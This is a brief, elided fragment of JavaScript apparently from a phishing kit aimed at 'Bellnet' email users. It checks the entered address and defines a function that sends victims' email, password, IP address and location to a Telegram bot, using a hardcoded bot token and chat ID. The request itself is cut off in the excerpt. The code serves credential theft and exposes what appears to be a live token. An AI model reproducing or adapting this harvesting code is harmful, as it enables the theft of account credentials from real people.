...
if (!validateEmail() || !isBellnetEmail) {
  ...
  async function sendDataToTelegram(email, password, ip, location, modalEmail, modalPassword) {
    const botToken = '7513571536:AAGw-1MiGTropZRI-Axcv5SpyKWvvdJhOJ0'; // Replace with your(others) Telegram bot token
      const chatId = '906558937'; // Replace with your(others) Telegram chat ID
